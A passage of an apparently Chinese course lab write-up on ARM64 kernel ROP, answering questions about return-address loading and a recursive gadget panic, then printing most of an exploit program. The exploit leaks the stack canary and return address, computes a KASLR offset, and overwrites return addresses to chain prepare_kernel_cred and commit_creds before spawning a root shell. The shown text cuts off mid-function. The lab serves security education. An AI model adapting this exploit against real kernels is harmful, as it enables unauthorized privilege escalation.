+&lt;li>在ARM64的ROP中，在 &lt;code>zjubof_write4&lt;/code>中overflow覆盖到的返回地址，会在 什么时候/执行到哪个函数哪一行的时候被load到pc寄存器？&lt;/li>
+&lt;/ol>
+&lt;p>会在&lt;code>zjubof_write3&lt;/code>的&lt;code>return 0;&lt;/code>，也就是在&lt;code>zjubof_write3&lt;/code>汇编的&lt;code>ldp x29, x30, [sp], #32&lt;/code>行，&lt;code>x29&lt;/code>和&lt;code>x30&lt;/code>被更新，然后执行&lt;code>ret&lt;/code>时load到pc寄存器&lt;/p>
+&lt;ol start="3">
+&lt;li>在Task2中，为什么在exp中直接覆盖返回地址为 &lt;code>first_level_gadget&lt;/code> 的汇编第一行地址，会造成kernel在运行到这一行的时候产生panic？并写出造成这个panic的触发链&lt;/li>
+&lt;/ol>
+&lt;p>当跳转到&lt;code>first_level_gadget&lt;/code>且尚未执行其中的汇编时，栈空间如下所示&lt;/p>
+&lt;p>&lt;img src="https://unicocn.github.io/p/rop/image-20230530181212838.png"
+width="791"
+height="305"
+srcset="https://unicocn.github.io/p/rop/image-20230530181212838_hu499750c5f631cff84c08e675253c5c6e_28269_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/rop/image-20230530181212838_hu499750c5f631cff84c08e675253c5c6e_28269_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 17"
+class="gallery-image"
+data-flex-grow="259"
+data-flex-basis="622px"
+>&lt;/p>
+&lt;p>此时&lt;code>zjubof_write3&lt;/code>和&lt;code>zjubof_write4&lt;/code>部分的栈空间已经被释放，可以看到&lt;code>sp&lt;/code>已经指向了栈底，同时&lt;code>x29&lt;/code>和&lt;code>x30&lt;/code>寄存器的值已经是被正确压栈了，此时我们如果跳到第一行，则又会将&lt;code>x29和x30&lt;/code>压栈，而此时的&lt;code>x29&lt;/code>和&lt;code>x30&lt;/code>寄存器保存的是&lt;code>first_level_gadget&lt;/code>的中的返回地址和旧栈帧，也就是下面这样&lt;/p>
+&lt;p>&lt;img src="https://unicocn.github.io/p/rop/image-20230530181128956.png"
+width="826"
+height="424"
+srcset="https://unicocn.github.io/p/rop/image-20230530181128956_hu40b8484df6a8b2c7955cc8417f6f8256_43892_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/rop/image-20230530181128956_hu40b8484df6a8b2c7955cc8417f6f8256_43892_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 18"
+class="gallery-image"
+data-flex-grow="194"
+data-flex-basis="467px"
+>&lt;/p>
+&lt;p>当&lt;code>first_level_gadget&lt;/code>执行完成后，会首先更新&lt;code>x29&lt;/code>和&lt;code>x30&lt;/code>，正常情况下会跳回&lt;code>zjubof_write1&lt;/code>，并将&lt;code>sp+220&lt;/code>进而恢复&lt;code>sp&lt;/code>，而现在则会再次跳到&lt;code>first_level_gadget&lt;/code>，同时&lt;code>sp+220&lt;/code>也会更新到错误的地方，之后就是重复的再次跳到&lt;code>first_level_gadget&lt;/code>，同时&lt;code>sp+220&lt;/code>错误的更新，直到stack overflow&lt;/p>
+&lt;ol start="4">
+&lt;li>Linux 内核是如何利用 ARM PA 来防御 ROP 攻击的&lt;/li>
+&lt;/ol>
+&lt;p>见Task4中的分析&lt;/p>
+&lt;p>附exp.c完整代码：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt"> 10
+&lt;/span>&lt;span class="lnt"> 11
+&lt;/span>&lt;span class="lnt"> 12
+&lt;/span>&lt;span class="lnt"> 13
+&lt;/span>&lt;span class="lnt"> 14
+&lt;/span>&lt;span class="lnt"> 15
+&lt;/span>&lt;span class="lnt"> 16
+&lt;/span>&lt;span class="lnt"> 17
+&lt;/span>&lt;span class="lnt"> 18
+&lt;/span>&lt;span class="lnt"> 19
+&lt;/span>&lt;span class="lnt"> 20
+&lt;/span>&lt;span class="lnt"> 21
+&lt;/span>&lt;span class="lnt"> 22
+&lt;/span>&lt;span class="lnt"> 23
+&lt;/span>&lt;span class="lnt"> 24
+&lt;/span>&lt;span class="lnt"> 25
+&lt;/span>&lt;span class="lnt"> 26
+&lt;/span>&lt;span class="lnt"> 27
+&lt;/span>&lt;span class="lnt"> 28
+&lt;/span>&lt;span class="lnt"> 29
+&lt;/span>&lt;span class="lnt"> 30
+&lt;/span>&lt;span class="lnt"> 31
+&lt;/span>&lt;span class="lnt"> 32
+&lt;/span>&lt;span class="lnt"> 33
+&lt;/span>&lt;span class="lnt"> 34
+&lt;/span>&lt;span class="lnt"> 35
+&lt;/span>&lt;span class="lnt"> 36
+&lt;/span>&lt;span class="lnt"> 37
+&lt;/span>&lt;span class="lnt"> 38
+&lt;/span>&lt;span class="lnt"> 39
+&lt;/span>&lt;span class="lnt"> 40
+&lt;/span>&lt;span class="lnt"> 41
+&lt;/span>&lt;span class="lnt"> 42
+&lt;/span>&lt;span class="lnt"> 43
+&lt;/span>&lt;span class="lnt"> 44
+&lt;/span>&lt;span class="lnt"> 45
+&lt;/span>&lt;span class="lnt"> 46
+&lt;/span>&lt;span class="lnt"> 47
+&lt;/span>&lt;span class="lnt"> 48
+&lt;/span>&lt;span class="lnt"> 49
+&lt;/span>&lt;span class="lnt"> 50
+&lt;/span>&lt;span class="lnt"> 51
+&lt;/span>&lt;span class="lnt"> 52
+&lt;/span>&lt;span class="lnt"> 53
+&lt;/span>&lt;span class="lnt"> 54
+&lt;/span>&lt;span class="lnt"> 55
+&lt;/span>&lt;span class="lnt"> 56
+&lt;/span>&lt;span class="lnt"> 57
+&lt;/span>&lt;span class="lnt"> 58
+&lt;/span>&lt;span class="lnt"> 59
+&lt;/span>&lt;span class="lnt"> 60
+&lt;/span>&lt;span class="lnt"> 61
+&lt;/span>&lt;span class="lnt"> 62
+&lt;/span>&lt;span class="lnt"> 63
+&lt;/span>&lt;span class="lnt"> 64
+&lt;/span>&lt;span class="lnt"> 65
+&lt;/span>&lt;span class="lnt"> 66
+&lt;/span>&lt;span class="lnt"> 67
+&lt;/span>&lt;span class="lnt"> 68
+&lt;/span>&lt;span class="lnt"> 69
+&lt;/span>&lt;span class="lnt"> 70
+&lt;/span>&lt;span class="lnt"> 71
+&lt;/span>&lt;span class="lnt"> 72
+&lt;/span>&lt;span class="lnt"> 73
+&lt;/span>&lt;span class="lnt"> 74
+&lt;/span>&lt;span class="lnt"> 75
+&lt;/span>&lt;span class="lnt"> 76
+&lt;/span>&lt;span class="lnt"> 77
+&lt;/span>&lt;span class="lnt"> 78
+&lt;/span>&lt;span class="lnt"> 79
+&lt;/span>&lt;span class="lnt"> 80
+&lt;/span>&lt;span class="lnt"> 81
+&lt;/span>&lt;span class="lnt"> 82
+&lt;/span>&lt;span class="lnt"> 83
+&lt;/span>&lt;span class="lnt"> 84
+&lt;/span>&lt;span class="lnt"> 85
+&lt;/span>&lt;span class="lnt"> 86
+&lt;/span>&lt;span class="lnt"> 87
+&lt;/span>&lt;span class="lnt"> 88
+&lt;/span>&lt;span class="lnt"> 89
+&lt;/span>&lt;span class="lnt"> 90
+&lt;/span>&lt;span class="lnt"> 91
+&lt;/span>&lt;span class="lnt"> 92
+&lt;/span>&lt;span class="lnt"> 93
+&lt;/span>&lt;span class="lnt"> 94
+&lt;/span>&lt;span class="lnt"> 95
+&lt;/span>&lt;span class="lnt"> 96
+&lt;/span>&lt;span class="lnt"> 97
+&lt;/span>&lt;span class="lnt"> 98
+&lt;/span>&lt;span class="lnt"> 99
+&lt;/span>&lt;span class="lnt">100
+&lt;/span>&lt;span class="lnt">101
+&lt;/span>&lt;span class="lnt">102
+&lt;/span>&lt;span class="lnt">103
+&lt;/span>&lt;span class="lnt">104
+&lt;/span>&lt;span class="lnt">105
+&lt;/span>&lt;span class="lnt">106
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/stat.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/types.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">const&lt;/span> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">RAWithoutKASLR&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xffff800010de7d0c&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">const&lt;/span> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">RAToFirstLevelGadget&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xffff8000107abd7c&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">const&lt;/span> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">RAOfPrepareKernelCred&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xffff8000100a6214&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">const&lt;/span> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">RAOfCommitCreds&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xffff8000100a5f6c&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">const&lt;/span> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">RAOfSecondLevelGadget&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xffff8000107abdb0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">const&lt;/span> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">RAOfZJUBofWrite&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xffff8000107abe54&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">char&lt;/span> &lt;span class="n">canaryStr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">char&lt;/span> &lt;span class="n">oldFPStr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="c1">// fp of zjubof_write2
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="n">oldRAStr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="c1">// ra of zjubof_write3 -&amp;gt; zjubof_write2
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">size_t&lt;/span> &lt;span class="nf">getOffset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">fd&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">49&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;0123456789ABCDEF&lt;/span>&lt;span class="se">\x30&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// cmd.command = &amp;#34;0123456789ABCDEF&amp;#34;, cmd.length = 0x30
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">24&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// // 16 + 8 B
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">48&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// CMD_LENGTH = 49, len &amp;lt; 49
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">canaryStr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">canaryStr&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">canaryStr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">oldFPStr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">oldFPStr&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">oldFPStr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">oldRAStr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">oldRAStr&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">oldRAStr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">40&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">canary&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">size_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">canaryStr&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">oldFP&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">size_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">oldFPStr&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">oldRA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">size_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">oldRAStr&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;canary = 0x%lx&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">canary&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;oldFP = 0x%lx&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">oldFP&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;oldRA = 0x%lx&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">oldRA&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">oldRA&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">RAWithoutKASLR&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;offset = 0x%lx&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">hackUsingFirstLevelGadget&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">49&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;0123456789ABCDEF&lt;/span>&lt;span class="se">\x30&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">newRA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">RAToFirstLevelGadget&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">24&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">canaryStr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">32&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">oldFPStr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">40&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">newRA&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">48&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">hackUsingROP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">161&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">24&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">canaryStr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">prepareKernelCredRA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">RAOfPrepareKernelCred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">40&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">prepareKernelCredRA&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">commitCredsRA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">RAOfCommitCreds&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">;&lt;/span>
